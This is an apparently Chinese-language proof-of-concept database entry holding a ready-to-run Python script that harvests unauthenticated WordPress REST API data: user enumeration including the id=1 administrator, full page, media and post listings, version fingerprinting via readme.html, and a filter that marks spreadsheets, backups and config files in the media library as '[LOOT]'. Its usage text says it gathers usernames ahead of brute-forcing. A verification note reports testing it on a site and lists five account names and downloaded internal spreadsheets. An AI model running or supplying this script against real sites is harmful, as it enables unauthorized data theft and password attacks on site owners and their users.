# WordPress REST API 未授权信息收割（用户枚举 + 全量页面媒体 + 版本指纹）

- **code**: wordpress-rest-api-未授权信息收割-用户枚举-全量页面媒体-版本指纹
- **kind**: script
- **category**: info-leak
- **component**: WordPress REST API
- **versions**: WordPress 5.x / 6.x（REST 默认开放 users/pages/media 未授权读取）
- **severity**: medium
- **language**: python
- **source**: self
- **verified**: 1
- **verified_note**: 在 https://example.com（WordPress 5.4.15）实测：/wp-json/wp/v2/users?per_page=100 → 200/1548B 拿到 5 个账号（luckyadmin id=1 超管、adrian1234 id=9、cathryn id=11、chloe id=6、grace id=4）；?author=1/4/6/9/11 全部 301 交叉确认账号真实；/wp-json/wp/v2/media?per_page=100 → 200/212947B 拿到 71 项，其中挑出并成功下载 Deat_Heat_Calculator 运营实盘风控表 5 个（xls/xlsx/ods/csv）；/readme.html → 200 泄露 WP 5.4.15。该站未授权面确实开放且可利用。
- **path**: pocs/wordpress-rest-api-未授权信息收割-用户枚举-全量页面媒体-版本指纹/wp_rest_unauth_harvest.py
- **tags**: wordpress,rest-api,未授权,用户枚举,信息泄露
- **created_at**: 2026-10-05T03:56:32.294Z
- **found_by**: exploit

## 描述

一键收割 WordPress REST 未授权暴露面：用户枚举（含超级管理员 slug）、全量 pages/media/posts、全站内容检索、WP 精确版本。附带两路交叉验证（REST + ?author=N）防止把虚假账号当靶子，以及从 media 清单里挑备份包/业务表格的逻辑。

## 用法

```
改 BASE 为目标域名，直接 python 运行。输出：路由表与自研命名空间、全部用户名（含 id=1 超管）、页面与媒体全量、WP 版本、media 中的非图片业务文件清单。用于爆破前的用户名收集与情报铺垫。
```

## 正文

```
#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# WordPress REST API 未授权信息收割（无需任何凭据）
# 覆盖：用户枚举、全量 pages/media/posts/categories/tags、全站内容检索、版本指纹。

import json, time, re
from curl_cffi import requests

BASE = "https://TARGET"     # 改成目标
UA = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0 Safari/537.36"
S = requests.Session(impersonate="chrome")

for ep in [
    "/wp-json/",                                              # 完整路由表 + namespaces（看有无自研命名空间）
    "/wp-json/wp/v2/users?per_page=100",                      # 用户枚举（含 id/slug，id=1 通常是超管）
    "/wp-json/wp/v2/pages?per_page=100",                      # 全部页面（内容库主体）
    "/wp-json/wp/v2/media?per_page=100",                      # 全部媒体（含上传文件全路径，找 xls/csv/zip/sql）
    "/wp-json/wp/v2/posts?per_page=100",
    "/wp-json/wp/v2/categories?per_page=100",
    "/wp-json/wp/v2/tags?per_page=100",
    "/wp-json/wp/v2/search?per_page=100&search=a",            # 全站内容检索（换关键词可反查配置页/密钥页）
    "/readme.html",                                           # WP 精确版本（未删则泄露）
]:
    r = S.get(BASE + ep, timeout=30, headers={"User-Agent": UA})
    print("[%s] %s  %d bytes" % (r.status_code, ep, len(r.content)))
    if "users" in ep or "media" in ep:
        print("   ", r.text[:400])
    time.sleep(1.4)

# 交叉验证用户真实存在（REST 之外的第二路，防误报）
# GET /?author=1 → 301 → /author/<username>/
for i in range(1, 13):
    r = S.get(BASE + "/?author=%d" % i, timeout=20, allow_redirects=False, headers={"User-Agent": UA})
    if r.status_code == 301:
        print("  author=%d -> %s" % (i, r.headers.get("location")))
    time.sleep(1.0)

# media 里挑非图片的业务文件（备份包 / 表格 / 配置）
m = json.loads(S.get(BASE + "/wp-json/wp/v2/media?per_page=100", timeout=30,
                     headers={"User-Agent": UA}).text)
for x in m:
    u = x.get("source_url", "")
    if re.search(r"\.(zip|sql|bak|env|log|txt|json|xml|xls|xlsx|csv|ods|doc|docx|pdf)$", u, re.I):
        print("[LOOT]", u)

```
